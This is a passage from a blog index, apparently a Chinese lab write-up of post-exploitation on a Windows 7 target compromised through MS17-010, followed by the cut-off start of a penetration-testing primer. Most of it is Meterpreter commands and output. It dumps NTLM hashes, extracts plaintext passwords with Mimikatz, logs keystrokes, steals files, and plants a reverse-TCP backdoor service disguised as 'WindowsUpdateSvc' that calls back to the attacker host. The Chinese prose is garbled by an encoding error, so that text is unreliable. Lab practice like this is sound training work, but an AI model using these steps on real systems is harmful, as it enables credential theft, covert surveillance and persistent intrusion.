05:39:27 +0000 [+] 10.0.0.17:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= [+] 10.0.0.17:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= [+] 10.0.0.17:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= meterpreter \u0026gt; 1 2 meterpreter \u0026gt; getuid Server username: NT AUTHORITY\\SYSTEM PSï¼šå½“å‰æƒé™â€”â€”NT AUTHORITY\\SYSTEM æƒé™ï¼ˆé€šå¸¸ç®€ç§°ä¸º System æƒé™ï¼‰æ˜¯ Windows æ“ä½œç³»ç»Ÿä¸­çš„æœ€é«˜æƒé™ã€‚åœ¨ Windows å®‰å…¨æ¨¡å‹ä¸­ï¼ŒSYSTEM è´¦æˆ·ï¼ˆä¹Ÿç§°ä¸ºæœ¬åœ°ç³»ç»Ÿè´¦æˆ·ï¼‰æ˜¯æ“ä½œç³»ç»Ÿå†…æ ¸åŠå…¶æ ¸å¿ƒæœåŠ¡è¿è¡Œçš„èº«ä»½ã€‚\nå®ƒæ¯”ç®¡ç†å‘˜ï¼ˆAdministratorï¼‰æ›´é«˜çº§ï¼šAdministrator ä»ç„¶å—ç”¨æˆ·å¸æˆ·æ§åˆ¶ï¼ˆUACï¼‰çš„é™åˆ¶ï¼Œè€Œ SYSTEM è´¦æˆ·ä¸å—ä»»ä½•é™åˆ¶ã€‚ æƒé™èŒƒå›´ï¼šå®ƒæ‹¥æœ‰å¯¹æœ¬åœ°è®¡ç®—æœºä¸Šæ‰€æœ‰èµ„æºï¼ˆæ–‡ä»¶ã€æ³¨å†Œè¡¨ã€è¿›ç¨‹ã€ç¡¬ä»¶ï¼‰çš„å®Œæ•´è®¿é—®æƒé™ã€‚ ç°åœ¨ï¼Œæ”»å‡»æœºå¯ä»¥è¿›è¡Œä»¥ä¸‹è¡Œä¸ºï¼š\nè¯»å–æ‰€æœ‰ç”¨æˆ·çš„æ–‡ä»¶ï¼šKaliå¯ä»¥è¿›å…¥ C:\\Users\\ ä¸‹ä»»ä½•ä¸€ä¸ªæ–‡ä»¶å¤¹ï¼ˆå¦‚ Administrator æˆ–å…¶ä»–æ™®é€šç”¨æˆ·ï¼‰ï¼Œè¯»å–ä»–ä»¬çš„æ¡Œé¢ã€æ–‡æ¡£å’Œéšç§æ–‡ä»¶ã€‚ æ§åˆ¶æ‰€æœ‰è¿›ç¨‹ï¼šKaliå¯ä»¥æ€æ­»é˜²ç«å¢™è¿›ç¨‹ã€æ€æ¯’è½¯ä»¶è¿›ç¨‹ï¼Œæˆ–è€…å°†ä½ çš„æ¶æ„ç¨‹åºæ³¨å…¥åˆ°ä»»ä½•ç³»ç»Ÿè¿›ç¨‹ï¼ˆå¦‚ lsass.exeï¼‰ä¸­ã€‚ æ“ä½œæ³¨å†Œè¡¨ï¼šKaliå¯ä»¥ä¿®æ”¹ç³»ç»Ÿçš„æ ¸å¿ƒé…ç½®ï¼Œç”šè‡³ç ´åç³»ç»Ÿå¼•å¯¼ã€‚ è·å–æ˜æ–‡å¯†ç ï¼šåªæœ‰åœ¨ SYSTEM æƒé™ä¸‹ï¼ŒKaliæ‰èƒ½ä½¿ç”¨ load kiwi (Mimikatz) ä»å†…å­˜ä¸­æå–å‡ºå…¶ä»–å·²ç™»å½•ç”¨æˆ·çš„æ˜æ–‡å¯†ç ã€‚ æƒé™é™çº§ï¼ˆä¼ªè£…ï¼‰ï¼šKaliå¯ä»¥éšæ„åˆ‡æ¢åˆ°ä»»ä½•ä¸€ä¸ªæ™®é€šç”¨æˆ·çš„èº«ä»½ï¼ˆé€šè¿‡ impersonate_tokenï¼‰ï¼Œçœ‹çœ‹ä»–ä»¬åœ¨ç”µè„‘ä¸Šç•™ä¸‹äº†ä»€ä¹ˆã€‚ å…¸å‹çš„â€œåæ¸—é€â€æ”»å‡»è¡Œä¸º ä¸€ã€å‡­æ®çªƒå– 1. å¯¼å‡ºå“ˆå¸Œå€¼ï¼ˆHashdumpï¼‰ 1 2 3 4 5 meterpreter \u0026gt; hashdump Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Ankh:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:e19302c2cb502fb48256d5cfbb575047::: PSï¼šè¿™æ˜¯é¶æœºç”¨æˆ·ç™»é™†å¯†ç çš„NTLMå“ˆå¸Œã€‚æ”»å‡»è€…å³ä½¿ä¸çŸ¥é“æ˜æ–‡ï¼Œä¹Ÿå¯ä»¥é€šè¿‡â€œå“ˆå¸Œä¼ é€’æ”»å‡»ï¼ˆPass-the-Hashï¼‰â€ç›´æ¥ç™»å½•å…¶ä»–æœºå™¨ã€‚\nåœ¨çº¿å“ˆå¸Œç©·ä¸¾è§£å¯†ï¼šCMD5\n2. æŠ“å–å†…å­˜ä¸­çš„æ˜æ–‡å¯†ç ï¼ˆMimikatzï¼‰ load kiwi # åŠ è½½å¢å¼ºç‰ˆçš„Mimikatz -\u0026gt; creds_all # å°è¯•æå–æ‰€æœ‰å‡­è¯\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 meterpreter \u0026gt; load kiwi Loading extension kiwi... .#####. mimikatz 2.2.0 20191125 (x64/windows) .## ^ ##. \u0026#34;A La Vie, A L\u0026#39;Amour\u0026#34; - (oe.eo) ## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \\ / ## \u0026gt; http://blog.gentilkiwi.com/mimikatz \u0026#39;## v ##\u0026#39; Vincent LE TOUX ( vincent.letoux@gmail.com ) \u0026#39;#####\u0026#39; \u0026gt; http://pingcastle.com / http://mysmartlogon.com ***/ Success. meterpreter \u0026gt; creds_all [+] Running as SYSTEM [*] Retrieving all credentials msv credentials =============== Username Domain LM NTLM SHA1 -------- ------ -- ---- ---- Ankh Ankh-PC 44efce164ab921caa 32ed87bdb5fdc5e9c 6ed5833cf35286ebf8 ad3b435b51404ee ba88547376818d4 662b7b5949f0d742bb ec3f wdigest credentials =================== Username Domain Password -------- ------ -------- (null) (null) (null) ANKH-PC$ WORKGROUP (null) Ankh Ankh-PC 123456 tspkg credentials ================= Username Domain Password -------- ------ -------- Ankh Ankh-PC 123456 kerberos credentials ==================== Username Domain Password -------- ------ -------- (null) (null) (null) Ankh Ankh-PC 123456 ankh-pc$ WORKGROUP (null) PSï¼šåœ¨Win7ä¸­ï¼Œæ”»å‡»è€…é€šå¸¸èƒ½å¤Ÿç›´æ¥çœ‹åˆ°Passwordä¸€æ æ˜¾ç¤ºäº†æ˜æ–‡å¯†ç ï¼Œè¿™æ˜¯ç”±äºWin7é»˜è®¤å°†å‡­æ®å­˜å‚¨åœ¨lsassè¿›ç¨‹å†…å­˜ä¸­ï¼Œä¸”æœªåŠ å¯†ã€‚SYSTEMæƒé™å¯ä»¥ç›´æ¥è¯»å–å®ƒã€‚\näºŒã€éšç§ç›‘æ§ä¸å–è¯ï¼ˆMonitoringï¼‰ 1. å®æ—¶å±å¹•æˆªå›¾ 1 2 meterpreter \u0026gt; screenshot Screenshot saved to: /root/ZuMWyRDh.jpeg 2. é”®ç›˜è®°å½•ï¼ˆKeyloggingï¼‰ å¦‚æœå½“å‰æ˜¯Systemæƒé™åˆ™åˆ‡æ¢åˆ°ç”¨æˆ·æƒé™ -\u0026gt; keyscan_start # å¼€å¯é”®ç›˜ç›‘å¬ -\u0026gt; Ankhç”¨æˆ·è¾“å…¥Hello? -\u0026gt; keyscan_dump # Kaliå±å¹•è¾“å‡ºè®°å½•ä¸‹çš„æŒ‰é”® -\u0026gt; keyscan_stop # åœæ­¢ç›‘å¬\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 meterpreter \u0026gt; getuid # æŸ¥çœ‹å½“å‰æƒé™ï¼šSYSTEM Server username: NT AUTHORITY\\SYSTEM meterpreter \u0026gt; ps # æŸ¥çœ‹è¿›ç¨‹åˆ—è¡¨ï¼ŒSession 1é€šå¸¸ä»£è¡¨ç”¨æˆ· Process List ============ PID PPID Name Arch Session User Path --- ---- ---- ---- ------- ---- ---- 0 0 [System Pr ocess] 4 0 System x64 0 268 4 smss.exe x64 0 NT AUTHORITY\\SYS \\SystemRoot\\Syste TEM m32\\smss.exe 312 484 svchost.ex x64 0 NT AUTHORITY\\LOC e AL SERVICE 344 328 csrss.exe x64 0 NT AUTHORITY\\SYS C:\\Windows\\system TEM 32\\csrss.exe 360 484 SearchInde x64 0 NT AUTHORITY\\SYS xer.exe TEM 392 328 wininit.ex x64 0 NT AUTHORITY\\SYS C:\\Windows\\system e TEM 32\\wininit.exe 404 384 csrss.exe x64 1 NT AUTHORITY\\SYS C:\\Windows\\system TEM 32\\csrss.exe 448 384 winlogon.e x64 1 NT AUTHORITY\\SYS C:\\Windows\\system xe TEM 32\\winlogon.exe 484 392 services.e x64 0 NT AUTHORITY\\SYS C:\\Windows\\system xe TEM 32\\services.exe 500 392 lsass.exe x64 0 NT AUTHORITY\\SYS C:\\Windows\\system TEM 32\\lsass.exe 508 392 lsm.exe x64 0 NT AUTHORITY\\SYS C:\\Windows\\system TEM 32\\lsm.exe 620 484 svchost.ex x64 0 NT AUTHORITY\\SYS e TEM 696 484 svchost.ex x64 0 NT AUTHORITY\\NET e WORK SERVICE 760 484 svchost.ex x64 0 NT AUTHORITY\\LOC e AL SERVICE 836 484 svchost.ex x64 0 NT AUTHORITY\\SYS e TEM 868 484 svchost.ex x64 0 NT AUTHORITY\\SYS e TEM 988 484 svchost.ex x64 0 NT AUTHORITY\\NET e WORK SERVICE 1052 484 spoolsv.ex x64 0 NT AUTHORITY\\SYS C:\\Windows\\System e TEM 32\\spoolsv.exe 1072 484 svchost.ex x64 0 NT AUTHORITY\\LOC e AL SERVICE 1168 484 svchost.ex x64 0 NT AUTHORITY\\LOC e AL SERVICE 1192 484 wmpnetwk.e x64 0 NT AUTHORITY\\NET xe WORK SERVICE 1368 2012 explorer.e x64 1 Ankh-PC\\Ankh C:\\Windows\\Explor xe er.EXE 1420 484 sppsvc.exe x64 0 NT AUTHORITY\\NET WORK SERVICE 1656 484 svchost.ex x64 0 NT AUTHORITY\\LOC e AL SERVICE 1692 484 svchost.ex x64 0 NT AUTHORITY\\NET e WORK SERVICE 1760 1368 taskmgr.ex x64 1 Ankh-PC\\Ankh C:\\Windows\\system e 32\\taskmgr.exe 1916 484 svchost.ex x64 0 NT AUTHORITY\\SYS e TEM 1960 484 taskhost.e x64 1 Ankh-PC\\Ankh C:\\Windows\\system xe 32\\taskhost.exe 2028 836 dwm.exe x64 1 Ankh-PC\\Ankh C:\\Windows\\system 32\\Dwm.exe 2308 1136 cmd.exe x64 0 NT AUTHORITY\\SYS C:\\Windows\\system TEM 32\\cmd.exe 2316 344 conhost.ex x64 0 NT AUTHORITY\\SYS C:\\Windows\\system e TEM 32\\conhost.exe 2468 1136 cmd.exe x64 0 NT AUTHORITY\\SYS C:\\Windows\\system TEM 32\\cmd.exe 2476 344 conhost.ex x64 0 NT AUTHORITY\\SYS C:\\Windows\\system e TEM 32\\conhost.exe 2716 1136 cmd.exe x64 0 NT AUTHORITY\\SYS C:\\Windows\\system TEM 32\\cmd.exe 2724 344 conhost.ex x64 0 NT AUTHORITY\\SYS C:\\Windows\\system e TEM 32\\conhost.exe 2920 1136 cmd.exe x64 0 NT AUTHORITY\\SYS C:\\Windows\\system TEM 32\\cmd.exe 2928 344 conhost.ex x64 0 NT AUTHORITY\\SYS C:\\Windows\\system e TEM 32\\conhost.exe 3044 1368 notepad.ex x64 1 Ankh-PC\\Ankh C:\\Windows\\system e 32\\NOTEPAD.EXE meterpreter \u0026gt; migrate 1368 # è¿ç§»åˆ°ç”¨æˆ·è¿›ç¨‹ä»è€Œæå–åˆ°ç”¨æˆ·æƒé™ [*] Migrating from 1052 to 1368... [*] Migration completed successfully. meterpreter \u0026gt; getuid # å½“å‰æƒé™ä¸ºAnkh Server username: Ankh-PC\\Ankh meterpreter \u0026gt; keyscan_start # å¼€å§‹é”®ç›˜å—…æ¢ Starting the keystroke sniffer ... meterpreter \u0026gt; keyscan_dump # æ‰“å°â€œHelloï¼Ÿâ€ Dumping captured keystrokes... \u0026lt;Shift\u0026gt;Hello\u0026lt;Shift\u0026gt;? meterpreter \u0026gt; keyscan_stop # ç»“æŸé”®ç›˜å—…æ¢ Stopping the keystroke sniffer... meterpreter \u0026gt; PSï¼šåˆ‡æ¢åˆ°ç”¨æˆ·èº«ä»½ä¹‹åä¸€èˆ¬å¾ˆéš¾æå‡åˆ°SYSTEMæƒé™ï¼ˆWindowså®‰å…¨æœºåˆ¶ï¼‰ï¼Œå¦‚æœå°è¯•getsystemæ— æœï¼Œåˆ™background -\u0026gt; runé‡æ–°æ‰§è¡Œexploit\n3. æ–‡ä»¶çªƒå–ä¸ä¸Šä¼  ä¸‹è½½ä¸Šä¸€æ­¥ä¸­é¶æœºæ¡Œé¢ä¿å­˜çš„hello.txtæ–‡ä»¶å¹¶ä¸Šä¼ ä¸€ä¸ªhi.txtæ–‡ä»¶ï¼ˆå¯ä»¥æ˜¯å¯æ‰§è¡Œçš„æ¶æ„ç¨‹åºï¼‰\n1 2 3 4 5 meterpreter \u0026gt; cat C:\\\\Users\\\\Ankh\\\\Desktop\\\\hello.txt # æ–‡ä»¶è¯»å– Hello?meterpreter \u0026gt; download C:\\\\Users\\\\Ankh\\\\Desktop\\\\hello.txt /home/kali/Desktop # æŠŠæ–‡ä»¶ä¸‹è½½åˆ°Kaliæ¡Œé¢ [*] Downloading: C:\\Users\\Ankh\\Desktop\\hello.txt -\u0026gt; /home/kali/Desktop/hello.txt [*] Downloaded 6.00 B of 6.00 B (100.0%): C:\\Users\\Ankh\\Desktop\\hello.txt -\u0026gt; /home/kali/Desktop/hello.txt [*] Completed : C:\\Users\\Ankh\\Desktop\\hello.txt -\u0026gt; /home/kali/Desktop/hello.txt 1 2 â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop] â””â”€$ echo \u0026#34;Hi\\!\u0026#34; \u0026gt; hi.txt # Kaliç»ˆç«¯åˆ›å»ºæ–‡ä»¶ 1 2 3 meterpreter \u0026gt; upload /home/kali/Desktop/hi.txt \u0026gt; C:\\\\Users\\\\Ankh\\\\Desktop\\\\ # ä¸Šä¼ æ–‡ä»¶ [*] Uploading : /home/kali/Desktop/hi.txt -\u0026gt; C:\\Users\\Ankh\\Desktop\\hi.txt [*] Completed : /home/kali/Desktop/hi.txt -\u0026gt; C:\\Users\\Ankh\\Desktop\\hi.txt ä¸‰ã€MetasploitæŒä¹…åŒ–åé—¨æ”»å‡» åˆ©ç”¨WindowsæœåŠ¡æœºåˆ¶å®ç°æƒé™ç»´æŒ Kalié€šè¿‡MS17-010æ¼æ´è·å¾—é¶æœºSYSTEMæƒé™ä¼šè¯åï¼Œä½¿ç”¨persistence_serviceæ¨¡å—åˆ›å»ºæŒä¹…åŒ–åé—¨ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 # ç»ˆç«¯1ï¼šæ”»å‡»é…ç½®ï¼š msf6 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; use exploit/windows/local/persistence_service # æŒä¹…åŒ–æœåŠ¡æ¨¡å— [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp msf6 exploit(windows/local/persistence_service) \u0026gt; set payload windows/meterpreter/reverse_tcp # å°†æ”»å‡»è½½è·è®¾ç½®ä¸º32ä½ï¼ˆé»˜è®¤ï¼‰ï¼Œ64ä½ä¼šå‡ºç°ä¸å…¼å®¹æƒ…å†µ msf6 exploit(windows/local/persistence_service) \u0026gt; set SESSION 1 # è®¾ç½®ä¸ºå½“å‰è·å–åˆ°SYSTEMæƒé™çš„ä¼šè¯IDã€‚å¯ä»¥é€šè¿‡sessionsæŒ‡ä»¤æŸ¥çœ‹ SESSION =\u0026gt; 1 msf6 exploit(windows/local/persistence_service) \u0026gt; set LHOST 10.0.0.223 # è®¾ç½®ä¸ºKali IP LHOST =\u0026gt; 10.0.0.223 msf6 exploit(windows/local/persistence_service) \u0026gt; set LPORT 4446 # æŒ‡å®šä¸€ä¸ªç›‘å¬ç«¯å£ LPORT =\u0026gt; 4446 msf6 exploit(windows/local/persistence_service) \u0026gt; set SERVICE_NAME WindowsUpdateSvc SERVICE_NAME =\u0026gt; WindowsUpdateSvc # å°†æœåŠ¡åä¼ªè£… payload =\u0026gt; windows/meterpreter/reverse_tcp msf6 exploit(windows/local/persistence_service) \u0026gt; run #æ‰§è¡Œ [*] Started reverse TCP handler on 10.0.0.223:4446 [*] Running module against ANKH-PC [+] Meterpreter service exe written to C:\\Windows\\TEMP\\keQgBw.exe [*] Creating service WindowsUpdateSvc [*] Cleanup Meterpreter RC File: /root/.msf4/logs/persistence/ANKH-PC_20251231.0748/ANKH-PC_20251231.0748.rc [*] Sending stage (177734 bytes) to 10.0.0.17 [*] Meterpreter session 2 opened (10.0.0.223:4446 -\u0026gt; 10.0.0.17:49159) at 2025-12-31 09:07:49 +0000 PSï¼šç”±äºè¯¥æ¨¡å—åˆ›å»ºäº†ä¸€ä¸ªæŒä¹…åŒ–æœåŠ¡å¹¶ä¸”ç«‹åˆ»å¯åŠ¨äº†è¯¥æœåŠ¡ï¼Œå› æ­¤è¯¥æœåŠ¡ä¼šä¸»åŠ¨å‘æ”»å‡»æœºå‘èµ·è¿æ¥ã€‚å› æ­¤å¯åŠ¨è¯¥æ¨¡å—åç«‹åˆ»åˆ›å»ºäº†ä¸€ä¸ªæ–°çš„ä¼šè¯ï¼ˆsession 2ï¼‰ã€‚ä¸¤ä¸ªä¼šè¯çš„æƒé™ç›¸åŒ\nåˆ›å»ºç›‘å¬å™¨ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # ç»ˆç«¯2ï¼šç›‘å¬é…ç½® msf6 \u0026gt; use exploit/multi/handler [*] Using configured payload generic/shell_reverse_tcp msf6 exploit(multi/handler) \u0026gt; set payload windows/meterpreter/reverse_tcp # ä¸æ”»å‡»é…ç½®ä¸€è‡´ payload =\u0026gt; windows/meterpreter/reverse_tcp msf6 exploit(multi/handler) \u0026gt; set LHOST 10.0.0.223 # ç»‘å®šæ”»å‡»æœºIP LHOST =\u0026gt; 10.0.0.223 msf6 exploit(multi/handler) \u0026gt; set LPORT 4446 # ç»‘å®šç›‘å¬ç«¯å£ LPORT =\u0026gt; 4446 msf6 exploit(multi/handler) \u0026gt; set ExitOnSession false # å³ä½¿æ–­å¼€ä¹Ÿä¿æŒç›‘å¬ ExitOnSession =\u0026gt; false msf6 exploit(multi/handler) \u0026gt; run -j # -jä¸ºåå°è¿è¡Œ [*] Exploit running as background job 0. [*] Exploit completed, but no session was created. [*] Started reverse TCP handler on 10.0.0.223:4446 msf6 exploit(multi/handler) \u0026gt; é‡å¯é¶æœº 1 2 3 4 # ç»ˆç«¯1ï¼šï¼ˆé‡å¯é¶æœºï¼Œæ— éœ€ç™»å½•ï¼‰åŸä¼šè¯æ–­å¼€ [*] 10.0.0.17 - Meterpreter session 1 closed. Reason: Died [*] 10.0.0.17 - Meterpreter session 2 closed. Reason: Died é¶æœºè‡ªåŠ¨è¿æ¥ç›‘å¬å™¨ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 # ç»ˆç«¯2ï¼šç›‘å¬åˆ°æ–°çš„ä¼šè¯è¿æ¥ï¼ˆSYSTEMæƒé™ï¼‰ [*] Sending stage (177734 bytes) to 10.0.0.17 [*] Meterpreter session 1 opened (10.0.0.223:4446 -\u0026gt; 10.0.0.17:49205) at 2025-12-31 09:09:46 +0000 msf6 exploit(multi/handler) \u0026gt; sessions Active sessions =============== Id Name Type Information Connection -- ---- ---- ----------- ---------- 1 meterpreter x86/win NT AUTHORITY\\SYSTEM 10.0.0.223:4446 -\u0026gt; 1 dows @ ANKH-PC 0.0.0.17:49205 (10.0 .0.17) msf6 exploit(multi/handler) \u0026gt; sessions -i 1 [*] Starting interaction with 1... meterpreter \u0026gt; getuid Server username: NT AUTHORITY\\SYSTEM meterpreter \u0026gt; ç›¸å…³åŸç† æŒä¹…åŒ–æœºåˆ¶ï¼š ç”Ÿæˆmeterpreteråé—¨ç¨‹åº â†’ C:\\Windows\\TEMP\\keQgBw.exe åˆ›å»ºWindowsæœåŠ¡ â†’ \u0026ldquo;WindowsUpdateSvc\u0026rdquo; é…ç½®æœåŠ¡è‡ªåŠ¨å¯åŠ¨ï¼ˆå¼€æœºè‡ªå¯ï¼‰ æœåŠ¡æŒ‡å‘åé—¨ç¨‹åºè·¯å¾„ æœåŠ¡ä¼ªè£…æŠ€å·§ï¼š æœåŠ¡åä¼ªè£…ï¼šä½¿ç”¨WindowsUpdateSvcè¿™æ ·çš„åˆæ³•åç§°ï¼Œé¿å…è¢«è½»æ˜“å‘ç° æ–‡ä»¶è·¯å¾„ï¼šå­˜æ”¾åœ¨C:\\Windows\\TEMP\\ï¼Œåˆ©ç”¨ç³»ç»Ÿç›®å½•é™ä½æ€€ç–‘ æƒé™ç»§æ‰¿ï¼šæœåŠ¡ä»¥SYSTEMæƒé™è¿è¡Œï¼Œç»´æŒé«˜æƒé™è®¿é—® ç½‘ç»œé€šä¿¡æœºåˆ¶ åå‘è¿æ¥ï¼šé¶æœºä¸»åŠ¨è¿æ¥æ”»å‡»æœºï¼ˆ10.0.0.223:4446ï¼‰ ä¼˜åŠ¿ï¼šå¯ç»•è¿‡å‡ºç«™é˜²ç«å¢™é™åˆ¶ï¼ˆå¤§å¤šæ•°é˜²ç«å¢™å…è®¸å‡ºç«™è¿æ¥ï¼‰ ç¨³å®šæ€§ï¼šå³ä½¿è¿æ¥æ–­å¼€ä¹Ÿä¼šå°è¯•é‡è¿ å››ã€Shell åœ¨meterpreterä¸‹æ‰§è¡Œshellå¯ä»¥SYSTEMèº«ä»½è¿›å…¥é¶æœºç»ˆç«¯ã€‚ç”±äºç¼–ç é—®é¢˜ï¼ˆWindowsç»ˆç«¯é‡‡ç”¨GBKç¼–ç ï¼Œè€ŒKaliç»ˆç«¯é‡‡ç”¨UTF-8ç¼–ç ï¼‰shellåå¯èƒ½å‡ºç°ä¹±ç ï¼Œå¯ä»¥é€šè¿‡æŒ‡ä»¤ä¿®æ”¹é¶æœºç¼–ç æ–¹å¼ï¼ˆchcp 65001ï¼ŒWindowså‘½ä»¤æç¤ºç¬¦(cmd)ä¸­è®¾ç½®ä»£ç é¡µ(Code Page)çš„å‘½ä»¤ï¼‰ä»¥è§£å†³è¯¥é—®é¢˜\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 meterpreter \u0026gt; shell Process 1028 created. Channel 2 created. Microsoft Windows [ï¿½æ±¾ 6.1.7600] ï¿½ï¿½È¨ï¿½ï¿½ï¿½ï¿½ (c) 2009 Microsoft Corporationï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½È¨ï¿½ï¿½ï¿½ï¿½ C:\\Windows\\system32\u0026gt;chcp 65001 chcp 65001 Active code page: 65001 # 936å¯¹åº”GBKï¼Œ65001å¯¹åº”UTF-8 C:\\Windows\\system32\u0026gt;whoami whoami nt authority\\system C:\\Windows\\system32\u0026gt;cd C:\\Users\\Ankh\\Desktop cd C:\\Users\\Ankh\\Desktop C:\\Users\\Ankh\\Desktop\u0026gt;tree /f tree /f Folder PATH listing Volume serial number is 000001BD 0014:5107 C:. Hello.txt hi.txt No subfolders exist C:\\Users\\Ankh\\Desktop\u0026gt;type Hello.txt type Hello.txt Hello? C:\\Users\\Ankh\\Desktop\u0026gt;exit exit meterpreter \u0026gt; ","date":"2025-12-30T16:23:12+08:00","image":"http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/ms17-010_hu_b85629e489f8903d.png","permalink":"http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/","title":"ã€æ”»é˜²å®è·µã€‘MS17-010æ¼æ´åˆ©ç”¨"},{"content":"æ¸—é€æµ‹è¯•åŸºç¡€ æ¦‚è¿°ï¼šé€šè¿‡å„ç§æ‰‹æ®µå¯¹ç›®æ ‡è¿›è¡Œæ¸—é€æ”»å‡»ï¼Œé€šè¿‡æ¸—é€æ¥æµ‹è¯•ç›®æ ‡çš„å®‰å…¨é˜²æŠ¤èƒ½åŠ› åº•å±‚åŸºç¡€ï¼šç›®æ ‡ç³»ç»Ÿä¸­å­˜åœ¨å®‰å…¨æ¼æ´ï¼ˆLoopholeï¼ŒæŒ‡ä¿¡æ¯ç³»ç»Ÿä¸­å­˜åœ¨çš„ç¼ºé™·æˆ–ä¸é€‚å½“çš„é…ç½®ï¼Œå…¶å¯ä½¿æ”»å‡»è€…åœ¨æœªæˆæƒæƒ…å†µä¸‹è®¿é—®æˆ–ç ´åç³»ç»Ÿï¼Œå¯¼è‡´ä¿¡æ¯ç³»ç»Ÿé¢ä¸´å®‰å…¨é£é™©ï¼‰ æ¸—é€ä»£ç ï¼ˆExploitï¼‰ï¼šåˆ©ç”¨å®‰å…¨æ¼æ´æ¥é€ æˆå…¥ä¾µæˆ–ç ´åæ•ˆæœçš„ç¨‹åºæˆ–è€…æ¼æ´åˆ©ç”¨ä»£ç  æµ‹è¯•åˆ†ç±» é»‘ç›’æµ‹è¯• æ¦‚å¿µï¼š æµ‹è¯•äººå‘˜åœ¨å®Œå…¨ä¸äº†è§£ç›®æ ‡ç³»ç»Ÿå†…éƒ¨ç»“æ„ã€æºä»£ç ã€ç½‘ç»œæ‹“æ‰‘ã€æŠ€æœ¯æ ˆç­‰ä¿¡æ¯çš„æƒ…å†µä¸‹è¿›è¡Œæµ‹è¯•ã€‚ä»–ä»¬ä»…æ‹¥æœ‰ä¸€ä¸ªå…¬å¼€çš„è®¿é—®ç‚¹ï¼ˆä¾‹å¦‚ä¸€ä¸ªç½‘ç«™URLæˆ–å…¬å¸åç§°ï¼‰ã€‚ ä¿¡æ¯æ¥æºï¼š å®Œå…¨ä¾èµ–å…¬å¼€ä¿¡æ¯æ”¶é›†ï¼Œå¦‚æœç´¢å¼•æ“ã€WhoisæŸ¥è¯¢ã€ç¤¾äº¤åª’ä½“ã€å…¬å¼€ç«¯å£æ‰«æç­‰ã€‚ ä¼˜ç‚¹ï¼š æ¨¡æ‹ŸçœŸå®æ”»å‡»ï¼š æœ€æ¥è¿‘æ¶æ„é»‘å®¢çš„çœŸå®æ”»å‡»åœºæ™¯ã€‚ æµ‹è¯•å¤–éƒ¨é˜²å¾¡ï¼š èƒ½æœ‰æ•ˆè¯„ä¼°è¾¹ç•Œå®‰å…¨é˜²æŠ¤ï¼ˆå¦‚é˜²ç«å¢™ã€WAFï¼‰å’Œæš´éœ²åœ¨å¤–çš„æœåŠ¡çš„å®‰å…¨æ€§ã€‚ å…³æ³¨ä¸šåŠ¡é€»è¾‘æ¼æ´ï¼š æ›´å®¹æ˜“ä»ç”¨æˆ·è§†è§’å‘ç°ä¸šåŠ¡é€»è¾‘ç¼ºé™·ã€‚ ç¼ºç‚¹ï¼š æ•ˆç‡è¾ƒä½ï¼š éœ€è¦å¤§é‡æ—¶é—´è¿›è¡Œä¿¡æ¯æ”¶é›†å’Œæ‘¸ç´¢ï¼Œå¯èƒ½æ— æ³•è¦†ç›–æ·±å±‚æ¬¡æ¼æ´ã€‚ è¦†ç›–é¢æœ‰é™ï¼š å¾ˆéš¾åœ¨æœ‰é™æ—¶é—´å†…æµ‹è¯•åˆ°æ‰€æœ‰å†…éƒ¨æ¥å£å’Œè·¯å¾„ï¼Œå¯èƒ½é—æ¼éšè—æ¼æ´ã€‚ æ·±åº¦ä¸è¶³ï¼š éš¾ä»¥å‘ç°ç”±ç³Ÿç³•çš„ä»£ç å®ç°ã€é”™è¯¯çš„é…ç½®ç­‰å¼•èµ·çš„æ·±å±‚å®‰å…¨é—®é¢˜ã€‚ é€‚ç”¨åœºæ™¯ï¼š å¤–éƒ¨ç½‘ç»œæ¸—é€æµ‹è¯•ã€çº¢é˜Ÿæ¼”ç»ƒã€æ¨¡æ‹ŸAPTæ”»å‡»ã€å¯¹å·²ä¸Šçº¿ç³»ç»Ÿè¿›è¡Œå¤–éƒ¨é£é™©è¯„ä¼°ã€‚ ç™½ç›’æµ‹è¯• æ¦‚å¿µï¼š æµ‹è¯•äººå‘˜åœ¨æ‹¥æœ‰ç›®æ ‡ç³»ç»Ÿå…¨éƒ¨æˆ–è¿‘ä¹å…¨éƒ¨ä¿¡æ¯çš„æƒ…å†µä¸‹è¿›è¡Œæµ‹è¯•ã€‚è¿™é€šå¸¸åŒ…æ‹¬æºä»£ç 